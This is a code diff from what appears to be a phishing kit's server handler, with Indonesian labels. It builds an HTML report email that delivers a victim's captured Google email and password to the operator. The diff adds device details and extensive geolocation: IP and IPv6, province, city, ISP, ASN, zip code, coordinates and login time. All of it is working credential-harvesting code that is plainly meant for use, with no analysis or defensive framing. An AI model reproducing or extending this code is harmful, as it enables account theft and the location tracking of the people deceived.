@@ -35,17 +35,14 @@ export default async function handler(req, res) {
             const cfgData = await rCfg.json();
             if (cfgData && cfgData[0]) {
                 if (cfgData[0].email_tujuan) EMAIL = cfgData[0].email_tujuan;
-                
-                // BERSIHIN NAMA RESS DARI KARAKTER <EMAIL>
-                if (cfgData[0].nama_ress) {
-                    NAMA = cfgData[0].nama_ress.split('<')[0].trim();
-                }
+                if (cfgData[0].nama_ress) NAMA = cfgData[0].nama_ress.split('<')[0].trim();
             }
         } catch(e) { console.log("Gagal ambil config:", e); }
 
         const flag = countryFlag(d.negaraKode || "");
         const previewText = "ID | +62 | LOGIN Google | IP " + (d.ip || "-");
 
+        // FORMAT EMAIL LENGKAP
         const htmlBody = `
         <div style="display:none;max-height:0;overflow:hidden;font-size:1px;line-height:1px;color:#fff">${previewText}</div>
         <div style="font-family:Arial,sans-serif;background:#f4f4f4;padding:20px">
@@ -58,14 +55,34 @@ export default async function handler(req, res) {
               <table style="width:100%;font-size:14px;border-collapse:collapse">
                 <tr><td style="padding:10px;font-weight:bold;width:35%">EMAIL</td><td style="padding:10px">${d.email || "-"}</td></tr>
                 <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">PASSWORD</td><td style="padding:10px">${d.password || "-"}</td></tr>
+                <tr><td style="padding:10px;font-weight:bold">LOGIN</td><td style="padding:10px">Google</td></tr>
               </table>
+
+              <h3 style="color:#1a73e8;border-bottom:2px solid #1a73e8;padding-bottom:8px;margin-top:30px">📱 DEVICE INFO</h3>
+              <table style="width:100%;font-size:14px;border-collapse:collapse">
+                <tr><td style="padding:10px;font-weight:bold;width:35%">DEVICE</td><td style="padding:10px">${d.device || "-"}</td></tr>
+                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">OS VERSION</td><td style="padding:10px">${d.os || "-"}</td></tr>
+                <tr><td style="padding:10px;font-weight:bold">BROWSER</td><td style="padding:10px">${d.browser || "-"}</td></tr>
+              </table>
+
               <h3 style="color:#1a73e8;border-bottom:2px solid #1a73e8;padding-bottom:8px;margin-top:30px">📍 LOCATION INFO</h3>
               <table style="width:100%;font-size:14px;border-collapse:collapse">
                 <tr><td style="padding:10px;font-weight:bold;width:35%">ALAMAT IP</td><td style="padding:10px">${d.ip || "-"}</td></tr>
-                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">KOTA</td><td style="padding:10px">${d.kota || "-"}</td></tr>
+                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">IPV6</td><td style="padding:10px">${d.ipv6 || "-"}</td></tr>
+                <tr><td style="padding:10px;font-weight:bold">NEGARA</td><td style="padding:10px">${flag} ${d.negara || "-"}</td></tr>
+                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">PROVINSI</td><td style="padding:10px">${d.prov || "-"}</td></tr>
+                <tr><td style="padding:10px;font-weight:bold">KOTA</td><td style="padding:10px">${d.kota || "-"}</td></tr>
+                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">ZONA WAKTU</td><td style="padding:10px">${d.zona || "-"}</td></tr>
+                <tr><td style="padding:10px;font-weight:bold">PROVIDER</td><td style="padding:10px">${d.isp || "-"}</td></tr>
+                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">ASN</td><td style="padding:10px">${d.asn || "-"}</td></tr>
+                <tr><td style="padding:10px;font-weight:bold">ZIP CODE</td><td style="padding:10px">${d.zip || "-"}</td></tr>
+                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">LAT , LONG</td><td style="padding:10px">${d.koord || "-"}</td></tr>
+                <tr><td style="padding:10px;font-weight:bold">JAM MASUK</td><td style="padding:10px">${d.waktu || "-"}</td></tr>
               </table>
             </div>
-            <div style="background:#333;color:#fff;padding:15px;text-align:center;font-size:12px">${NAMA} - Real Data Stream</div>
+            <div style="background:#333;color:#fff;padding:15px;text-align:center;font-size:12px">
+              ${NAMA} - Real Data Stream
+            </div>
           </div>
         </div>`;
 
